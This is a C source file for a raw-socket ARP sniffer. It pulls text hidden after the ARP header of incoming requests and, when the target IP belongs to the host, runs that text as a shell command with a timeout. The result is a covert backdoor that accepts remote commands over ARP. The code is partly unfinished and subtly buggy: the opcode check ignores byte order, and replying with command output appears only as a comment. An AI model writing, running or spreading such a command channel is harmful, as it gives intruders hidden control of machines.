#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

#define BUF_SIZE 65536
#define PAYLOAD_BUF 1024
#define IP_ALEN 4

typedef unsigned char hwaddr[ETH_ALEN];
typedef unsigned char ipaddr[IP_ALEN];

typedef struct {
    unsigned short hardware_type:16;   // Hardware type (e.g., Ethernet)
    unsigned short protocol_type:16;   // Protocol type (e.g., IP)
    unsigned char hardware_size:8;    // Hardware address length
    unsigned char protocol_size:8;    // Protocol address length
    unsigned short opcode:16;          // ARP opcode (request or reply)
    unsigned char sender_mac[6];    // Sender MAC address (statically sizing this)
    unsigned char sender_ip[4];     // Sender IP address
    unsigned char target_mac[6];    // Target MAC address
    unsigned char target_ip[4];     // Target IP address
} arphdr;

typedef struct {
    char *payload;
    hwaddr src_eth;
    hwaddr dst_eth;
    
    hwaddr arp_hwsrc;
    ipaddr arp_ipsrc;

    hwaddr arp_hwdst;
    ipaddr arp_ipdst;
} sniff_t;

typedef struct ethhdr ethhdr;

volatile sig_atomic_t is_timed_out = 0;
void handle_alarm(int sig){
    is_timed_out = 1;
}

// Function to print the MAC address
void print_mac_address(unsigned char *mac) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}
// Compressed
void dumpHex(const void* data, size_t size) { char ascii[17]; size_t i, j; ascii[16] = '\0'; for (i = 0; i < size; ++i) { printf("%02X ", ((unsigned char*)data)[i]); if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') { ascii[i % 16] = ((unsigned char*)data)[i]; } else { ascii[i % 16] = '.'; } if ((i+1) % 8 == 0 || i+1 == size) { printf(" "); if ((i+1) % 16 == 0) { printf("|  %s \n", ascii); } else if (i+1 == size) { ascii[(i+1) % 16] = '\0'; if ((i+1) % 16 <= 8) { printf(" "); } for (j = (i+1) % 16; j < 16; ++j) { printf("   "); } printf("|  %s \n", ascii); } } } }

pid_t pid;
void handle_sigint(int sig) {
    if(pid > 0)
        kill(pid, SIGKILL);
    waitpid(pid, NULL, 0);
}

bool is_me(const char *ip_address) {
    FILE *fp;
    char buffer[2048];
    bool found = false;

    // Execute the "ip addr" command
    fp = popen("ip addr", "r");
    if (fp == NULL) {
        perror("Failed to run command");
        return false;
    }

    // Read the output line by line
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strstr(buffer, ip_address) != NULL) {
            found = true;
            break;
        }
    }

    pclose(fp);
    return found;
}

int execute_command_with_timeout(const char *command, int timeout, char *output, size_t output_size) {
    FILE *fp;
    size_t bytes_read = 0;

    // Setup alarm for timeout
    signal(SIGALRM, handle_alarm);
    alarm(timeout);

    fp = popen(command, "r");
    if (fp == NULL){
        perror("popen failed");
        return -1;
    }

    while (fgets(output + bytes_read, output_size - bytes_read, fp) != NULL) {
        bytes_read += strlen(output + bytes_read);
        if(bytes_read > output_size){
            break;
        }
        if (is_timed_out) {
            break;
        }
    }

    alarm(0);
    int status = pclose(fp);

    if(is_timed_out) {
        fprintf(stderr, "Command timed out\n");
        return -2;
    }

    return WEXITSTATUS(status);
}



void process_incoming(ethhdr *eth_header, arphdr* arp_header){
    // Step 1: Convert into sniff_t
    sniff_t *data = malloc(sizeof(sniff_t));

    // Extract ETH
    memcpy(data->src_eth, eth_header->h_source, ETH_ALEN);
    memcpy(data->dst_eth, eth_header->h_dest, ETH_ALEN);

    // Extract ARP
    memcpy(data->arp_hwsrc, arp_header->sender_mac, ETH_ALEN);
    memcpy(data->arp_ipsrc, arp_header->sender_ip, IP_ALEN);

    memcpy(data->arp_hwdst, arp_header->target_mac, ETH_ALEN);
    memcpy(data->arp_ipdst, arp_header->target_ip, IP_ALEN);

    // Extract Payload
    data->payload = malloc(PAYLOAD_BUF + 1);
    memcpy(data->payload, (char *)(((void *)eth_header) + sizeof(ethhdr) + 4 + 4 + 6 + 4 + 6 + 4), PAYLOAD_BUF);
    data->payload[PAYLOAD_BUF] = 0;



    // Step 2: Print info
    printf("\nEthernet Frame\n");
    printf("Destination MAC: ");
    print_mac_address(eth_header->h_dest);
    printf("\nSource MAC: ");
    print_mac_address(eth_header->h_source);
    printf("\nProtocol: 0x%04x\n", ntohs(eth_header->h_proto));

    printf("\nARP Packet\n");
    printf("Sender MAC: ");
    print_mac_address(arp_header->sender_mac);
    printf("\nSender IP: %d.%d.%d.%d\n", arp_header->sender_ip[0], arp_header->sender_ip[1], arp_header->sender_ip[2], arp_header->sender_ip[3]);
    printf("Target MAC: ");
    print_mac_address(arp_header->target_mac);
    char target_ip[15];
    snprintf(target_ip, 15, "%d.%d.%d.%d", arp_header->target_ip[0], arp_header->target_ip[1], arp_header->target_ip[2], arp_header->target_ip[3]);
    printf("\nTarget IP: %s\n", target_ip);




    if(is_me(target_ip)){
        printf("It's for me!\n");
        printf("Command to execute: %s\n", data->payload);

        char *output = malloc(PAYLOAD_BUF + 1);
        int status = execute_command_with_timeout(data->payload, 10, output, PAYLOAD_BUF);
        output[PAYLOAD_BUF] = 0;
        if (status == 0) {
            // Success, send output as reply
            fprintf(stderr, "Success! -- \n%s\n -- \n", output);
        } else if (status == -2) {
            // Failed, send timeout as reply
            fprintf(stderr, "Failed! Command timed out.\n");
        } else {
            // Failed, send default reply
            fprintf(stderr, "Unkown failure! Sending default reply...\n");
        }
        free(data->payload);
        free(data);
    } else {
        printf("It's not for me :(\n");
    }
}

// Main packet sniffer function
int sniff() {
    int sockfd;
    unsigned char buffer[BUF_SIZE];
    struct sockaddr saddr;
    ethhdr *eth_header;
    arphdr *arp_header;
    socklen_t saddr_len = sizeof(saddr);

    // Create a raw socket
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("Socket error");
        exit(EXIT_FAILURE);
    }

    while (1) {
        // Receive a packet
        int packet_len = recvfrom(sockfd, buffer, BUF_SIZE, 0, &saddr, &saddr_len);
        if (packet_len < 0) {
            perror("Recvfrom error");
            exit(EXIT_FAILURE);
        }
        
        fprintf(stderr, "Packet found\n");

        eth_header = (ethhdr *)buffer;
        arp_header = (arphdr *)(buffer + sizeof(ethhdr));

        if(arp_header->opcode != 1){ // ignore non-requests
            fprintf(stderr, "Not an ARP Request\n");
            continue;
        }

        pid = fork();
        if(pid == 0){
            process_incoming(eth_header, arp_header);
            exit(EXIT_SUCCESS);
        }

    }

    close(sockfd);
    return 0;
}

// FIXME:
#define IF_NAME "eth0"

int main(){
    // TODO: On start kill all orphans
    sniff();
}
